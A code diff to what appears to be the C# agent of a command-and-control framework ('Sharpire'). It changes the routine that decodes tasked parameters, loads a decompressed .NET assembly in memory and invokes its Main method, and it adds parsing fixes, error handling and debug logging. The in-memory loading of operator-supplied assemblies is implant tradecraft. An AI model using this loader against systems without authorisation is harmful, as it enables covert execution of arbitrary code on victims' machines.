@@ -600,17 +600,17 @@ namespace Sharpire
                 string base64JsonString = parts[1];
                 string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
 
-                // Manually parse JSON into a list of parameters
+                // Manually parse JSON to extract all values as a generic string array
                 var parametersList = new List<string>();
-                jsonString = jsonString.Trim('{', '}');
+                jsonString = jsonString.Trim('{', '}'); // Remove braces if present
                 string[] keyValuePairs = jsonString.Split(',');
 
                 foreach (string pair in keyValuePairs)
                 {
-                    string[] keyValue = pair.Split(':');
+                    string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
                     if (keyValue.Length == 2)
                     {
-                        string value = keyValue[1].Trim().Trim('"');
+                        string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
                         parametersList.Add(value);
                     }
                 }
@@ -622,7 +622,7 @@ namespace Sharpire
                 byte[] decompressedBytes = Decompress(compressedBytes);
                 Assembly agentTask = Assembly.Load(decompressedBytes);
 
-                // If OutputStream is not available, use Console.SetOut only
+                // Create a background thread for the task
                 Thread taskThread = new Thread(() =>
                 {
                     using (StringWriter consoleOutput = new StringWriter())
@@ -630,14 +630,37 @@ namespace Sharpire
                         TextWriter originalConsoleOut = Console.Out;
                         try
                         {
-                            Console.SetOut(consoleOutput); // Redirect Console.Out to StringWriter
-                            agentTask.GetType("Program").GetMethod("Main")?.Invoke(null, new object[] { parameters });
+                            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
+
+                            // Verify parameters and invoke Main method
+                            MethodInfo mainMethod = agentTask.GetType("Program").GetMethod("Main");
+                            if (mainMethod != null)
+                            {
+                                mainMethod.Invoke(null, new object[] { parameters });
+                            }
+                            else
+                            {
+                                lock (synclock)
+                                {
+                                    output += "[ERROR] Main method not found in Program class.\n";
+                                }
+                            }
+                        }
+                        catch (TargetInvocationException ex)
+                        {
+                            // Capture and log the inner exception details
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] {ex.InnerException?.Message ?? ex.Message}\n";
+                                output += $"{ex.InnerException?.StackTrace ?? ex.StackTrace}\n";
+                            }
                         }
                         catch (Exception ex)
                         {
+                            // General exception logging
                             lock (synclock)
                             {
-                                output += $"[ERROR] {ex.Message}";
+                                output += $"[ERROR] {ex.Message}\n{ex.StackTrace}\n";
                             }
                         }
                         finally
@@ -714,28 +737,39 @@ namespace Sharpire
                 string base64JsonString = parts[1];
                 string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
 
+                // Log the raw JSON string for debugging
+                lock (synclock)
+                {
+                    output += $"[DEBUG] Raw JSON String: {jsonString}\n";
+                }
+
                 // Manually parse JSON to extract all values as a generic string array
                 var parametersList = new List<string>();
-                jsonString = jsonString.Trim('{', '}'); // Remove braces
+                jsonString = jsonString.Trim('{', '}'); // Remove braces if present
                 string[] keyValuePairs = jsonString.Split(',');
 
                 foreach (string pair in keyValuePairs)
                 {
-                    string[] keyValue = pair.Split(':');
+                    string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
                     if (keyValue.Length == 2)
                     {
-                        string value = keyValue[1].Trim().Trim('"');
+                        string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
                         parametersList.Add(value);
                     }
                 }
 
+                // Convert list to array and log the parsed values
                 string[] parameters = parametersList.ToArray();
-
-                // Log parameter information for debugging
                 lock (synclock)
                 {
-                    output += $"[DEBUG] Parameters Count: {parameters.Length}\n";
-                    output += $"[DEBUG] Parameters: {string.Join(", ", parameters)}\n";
+                    output += $"[DEBUG] Parameters Count After Parsing: {parameters.Length}\n";
+                    output += $"[DEBUG] Parameters After Parsing: {string.Join(", ", parameters)}\n";
+                }
+
+                if (parameters.Length == 0)
+                {
+                    output += "[ERROR] No values extracted from JSON input.";
+                    return EncodePacket(packet.type, output, packet.taskId);
                 }
 
                 // Decompress and load the assembly
